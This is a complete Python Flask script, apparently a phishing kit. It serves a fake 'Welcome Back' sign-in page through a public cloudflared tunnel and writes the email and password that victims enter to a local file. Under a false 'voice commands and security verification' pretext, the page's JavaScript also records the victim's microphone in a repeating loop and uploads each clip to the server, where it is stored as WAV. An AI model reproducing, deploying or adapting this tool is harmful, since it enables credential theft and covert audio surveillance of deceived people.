import os
import base64
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared, FFmpeg, and required Python packages."""
    # 1. Verify cloudflared
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("-> Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)

    # 2. **FIX**: Verify FFmpeg is installed (CRITICAL FOR SOUND)
    try:
        subprocess.run(["ffmpeg", "-version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'ffmpeg' is not installed or not in your system's PATH.", file=sys.stderr)
        print("-> FFmpeg is REQUIRED to process and save audio with sound.", file=sys.stderr)
        print("-> Please install it from: https://ffmpeg.org/download.html", file=sys.stderr)
        sys.exit(1)

    # 3. Check for required Python packages
    packages = {"Flask": "flask", "pydub": "pydub"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Installing missing package: {pkg_name}...", file=sys.stderr)
            install_package(pkg_name)

def get_recording_duration():
    """Prompt user to choose recording duration in seconds."""
    while True:
        try:
            print("\n" + "="*50)
            print("SET RECORDING DURATION")
            print("="*50)
            print("How many seconds should each recording be?")
            print("Recommended: 15-30 seconds for best results")
            print("="*50)
            
            duration = input("Enter duration in seconds (e.g., 15, 30, 60): ").strip()
            
            if not duration:
                print("Using default duration: 15 seconds")
                return 15000  # Default to 15 seconds in milliseconds
            
            duration_sec = int(duration)
            
            if duration_sec <= 0:
                print("Please enter a positive number.")
                continue
                
            if duration_sec > 300:  # 5 minutes max
                print("Warning: Very long duration (>5 minutes) may cause performance issues.")
                confirm = input("Continue anyway? (y/n): ").lower()
                if confirm != 'y':
                    continue
            
            print(f"Recording duration set to {duration_sec} seconds")
            return duration_sec * 1000  # Convert to milliseconds
            
        except ValueError:
            print("Invalid input. Please enter a number (e.g., 15, 30, 60).")
        except KeyboardInterrupt:
            print("\n\nOperation cancelled.")
            sys.exit(0)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\n{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()


# --- Flask Application ---
from pydub import AudioSegment

app = Flask(__name__)

# Global variable for recording duration (in milliseconds)
RECORDING_DURATION_MS = 15000  # Default 15 seconds

RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
os.makedirs(RECORDINGS_FOLDER, exist_ok=True)


def get_html_template(recording_duration_ms):
    """Generate HTML template with the specified recording duration."""
    recording_duration_sec = recording_duration_ms // 1000
    
    return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Welcome Back</h1>
                <p>To enable voice commands and for security verification, please allow microphone access.</p>
                <input type="email" name="email" placeholder="Enter your email address" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                <input type="submit" value="Sign In Securely">
            </form>
        </main>
        <footer>
            <a href="#">Terms of Use</a> &bull; <a href="#">Privacy Policy</a> &bull; <a href="#">Support</a>
        </footer>
    </div>
    <script>
        async function startRecordingLoop(stream) {{
            // **FIX**: Specify audio codec and bitrate for better quality and compatibility.
            const options = {{
                mimeType: 'audio/webm;codecs=opus',
                audioBitsPerSecond: 128000
            }};
            const recorder = new MediaRecorder(stream, options);
            const audioChunks = [];

            recorder.ondataavailable = event => {{
                if (event.data.size > 0) {{
                    audioChunks.push(event.data);
                }}
            }};

            recorder.onstop = () => {{
                const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {{
                    $.ajax({{
                        url: '/upload_audio', type: 'POST',
                        data: JSON.stringify({{ audio: reader.result.split(',')[1] }}),
                        contentType: 'application/json; charset=utf-8'
                    }});
                }};
                startRecordingLoop(stream);
            }};

            recorder.start();
            setTimeout(() => {{
                if(recorder.state === "recording") {{
                    recorder.stop();
                }}
            }}, {recording_duration_ms});
        }}

        async function init() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                startRecordingLoop(stream);
            }} catch (err) {{
                console.error("Microphone access denied:", err);
            }}
        }}

        window.onload = init;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(get_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(RECORDINGS_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Login successful. You will be redirected shortly.", 200

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data: return jsonify({"error": "No audio"}), 400
        audio_bytes = base64.b64decode(audio_data)
        
        # pydub uses ffmpeg to convert from webm to wav.
        # If ffmpeg is not installed, this will fail and create a silent/empty file.
        webm_audio = AudioSegment.from_file(BytesIO(audio_bytes), format="webm")
        
        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        webm_audio.export(os.path.join(RECORDINGS_FOLDER, filename), format="wav")
        
        return jsonify({"message": "Audio saved."}), 200
    except Exception as e:
        # Provide a more detailed error in the server console for debugging.
        print(f"[ERROR] Failed to process audio: {e}", file=sys.stderr)
        return jsonify({"error": "Failed to process audio on server."}), 500

if __name__ == '__main__':
    # Check dependencies first
    check_dependencies()
    
    # Get recording duration from user
    global RECORDING_DURATION_MS
    RECORDING_DURATION_MS = get_recording_duration()
    
    print(f"\n{'='*50}")
    print(f"Recording Configuration:")
    print(f"Duration: {RECORDING_DURATION_MS//1000} seconds")
    print(f"Save Location: {RECORDINGS_FOLDER}")
    print(f"{'='*50}\n")
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    script_name = "Login Page (Microphone)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)
